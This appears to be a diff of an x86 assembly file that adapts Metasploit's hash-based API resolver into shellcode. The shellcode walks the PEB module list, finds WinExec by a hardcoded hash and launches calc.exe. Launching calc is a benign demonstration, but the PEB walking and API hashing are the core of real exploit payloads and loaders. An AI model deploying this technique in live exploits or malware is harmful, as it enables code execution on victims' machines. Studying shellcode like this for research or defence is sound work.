@@ -7,15 +7,14 @@
 ALIGN 8
 ; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/single/single_exec.asm
 OPTION LANGUAGE: syscall
-@FindFunction@4 PROC
-; ECX - function hash
-api_call:
+@winexec@0 PROC
+ASSUME FS:NOTHING
   ASSUME FS:NOTHING
   pushad                     ; We preserve all the registers for the caller, bar EAX and ECX.
   mov ebp, esp               ; Create a new stack frame
   push ecx	
   xor edx, edx               ; Zero EDX
-  mov edx, fs:[30h]     ; Get a pointer to the PEB
+  mov edx, fs:[30h]			 ; Get a pointer to the PEB
   mov edx, [edx+0ch]         ; Get PEB->Ldr
   mov edx, [edx+14h]         ; Get the first module from the InMemoryOrder module list
 next_mod:                    ;
@@ -65,7 +64,7 @@ loop_funcname:               ;
   cmp al, ah                 ; Compare AL (the next byte from the name) to AH (null)
   jne loop_funcname          ; If we have not reached the null terminator, continue
   add edi, [ebp-0ch]           ; Add the current module hash to the function hash
-  cmp edi, [ebp+18h]        ; Compare the hash to the one we are searchnig for
+  cmp edi, 876f8b31h        ; Compare the hash to the one we are searchnig for 
   jnz get_next_func          ; Go compute the next function hash if we have not found it
   ; If found, fix up stack, call the function and then value else compute the next one...
   pop eax                    ; Restore the current modules EAT
@@ -83,7 +82,21 @@ loop_funcname:               ;
    pop ebx
    pop ebx
    pop ebx
-   ret 
+
+   
+   ; 63616c63 2e657865 calc.exe
+   xor ebx, ebx
+   push ebx
+   mov ebx, 6578652eh   
+   push ebx
+   mov ebx, 636c6163h
+   push ebx
+   lea ebx, [esp]
+
+   push byte +1
+   push ebx
+   call eax
+
 get_next_mod:                ;0078fba4
   pop eax                    ; Pop off the current (now the previous) modules EAT
 get_next_mod1:               ;
@@ -91,7 +104,7 @@ get_next_mod1:               ;
   pop edx                    ; Restore our position in the module list
   mov edx, [edx]             ; Get the next module
   jmp next_mod               ; Process this module
-@FindFunction@4 ENDP
+@winexec@0 ENDP
 OPTION LANGUAGE: C
 
 END
